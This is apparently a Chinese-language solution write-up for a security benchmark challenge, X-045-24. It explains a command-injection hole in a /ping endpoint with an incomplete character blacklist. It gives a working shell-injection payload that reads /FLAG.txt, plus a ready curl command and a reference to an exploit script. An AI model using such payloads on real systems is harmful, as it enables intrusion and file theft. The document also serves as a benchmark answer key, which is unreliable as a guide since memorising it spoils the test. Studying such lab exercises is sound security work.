# X-045-24 利用说明（过滤不严的命令注入）

## 漏洞概述
- 路由：`POST /ping`
- 代码关键：`command = 'ping -c 2 ' + ip_address`，随后 `subprocess.Popen(..., shell=True)` 执行。
- 过滤仅拦截：`< > | &`，未拦 `;`、`$()`、反引号等。
- 模板只渲染“解析后的摘要”，不是原始输出；但我们可以伪造一行符合解析正则的输出，将 flag 放在“Packets Received”字段里。

## 攻击思路
- 提交 `ip_address` 为：
  - `; echo 1 packets transmitted, $(cat /FLAG.txt) received, 0% packet loss`
- 这样拼接后执行的命令为：
  - `ping -c 2 ; echo 1 packets transmitted, $(cat /FLAG.txt) received, 0% packet loss`
- 由于 `ping -c 2` 无参数会打印用法到 stderr，`echo` 输出到 stdout；服务端优先取 stdout，正则在我们的 echo 行上匹配并把 `$(cat /FLAG.txt)` 的结果（flag）作为 “Packets Received” 显示。

## 一键脚本（exp.py）
- 路径：`benchmarks/X-045-24/exp.py`
- 依赖：`pip install requests`
- 默认目标：`http://ip32808`
- 用法：

```bash
python3 benchmarks/X-045-24/exp.py              # 打印 FLAG{...}
python3 benchmarks/X-045-24/exp.py http://host:port
```

## 直接命令（无需脚本）

```bash
BASE="http://ip32808"
curl -sS -L -X POST "$BASE/ping" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'ip_address=; echo 1 packets transmitted, $(cat /FLAG.txt) received, 0% packet loss'
# 页面中会显示：Packets Received: FLAG{...}
```

## 参考代码
- `benchmarks/X-045-24/app/app.py:12`（拼接命令 + 有限黑名单）
- `benchmarks/X-045-24/app/app.py:22`（调用 shell=True）
- `benchmarks/X-045-24/app/app.py:27-34`（对输出用正则提取摘要）
- `benchmarks/X-045-24/app/Dockerfile:14-17`（flag 写入 /FLAG.txt）

